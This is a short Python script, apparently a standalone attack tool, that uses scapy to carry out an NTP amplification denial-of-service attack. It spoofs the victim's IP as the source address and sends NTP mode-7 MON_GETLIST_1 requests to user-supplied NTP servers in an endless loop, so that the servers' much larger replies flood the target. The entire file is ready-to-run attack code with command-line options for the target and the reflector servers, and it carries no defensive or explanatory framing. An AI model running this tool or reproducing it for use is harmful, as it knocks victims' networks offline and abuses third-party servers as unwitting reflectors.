from scapy.all import IP, NTPPrivate, RandShort, send, UDP
import argparse
import sys

g_target_ip = ""
g_ntp_servers = []


"""
	This function adds user defined NTP servers to the list of servers to be queried.
"""
def append_ntp_ips(ntp_ips):
	global g_ntp_servers
	for specific_ip in ntp_ips:
		if not specific_ip in g_ntp_servers:
			g_ntp_servers.append(specific_ip)


"""
	This function creates a spoofed NTP MON_GETLIST_1 request and sends it to
	each specified NTP server.
"""
def ntp_amplification():
	global g_target_ip, g_ntp_servers

	# Create the NTP request
	ip = IP(src = g_target_ip)
	udp = UDP(sport = RandShort(), dport = 123)
	ntp = NTPPrivate(mode=7, implementation = "XNTPD", request_code="REQ_MON_GETLIST_1")

	while True:
		# Send the request to each of the NTP servers
		for ntp_ip in g_ntp_servers:
			ip.dst = ntp_ip
			packet = ip/udp/ntp
			send(packet)

def main():
	global g_target_ip, g_ntp_servers

	# Get the args
	parser = argparse.ArgumentParser()
	parser.add_argument("-t", help="Specify the target's IP")
	parser.add_argument("-n", nargs="+", type=str, help="Specify the list of NTP Servers")

	args = parser.parse_args()

	g_target_ip = args.t
	if (g_target_ip == None):
		sys.exit("[#] Please specify the target's IP address.\n[#] Exiting")

	if (args.n != None):
		append_ntp_ips(args.n)


	print("[*] Target IP: ", g_target_ip)
	print("[*] NTP Servers: ", g_ntp_servers)

	ntp_amplification()

if __name__ == "__main__":
	main()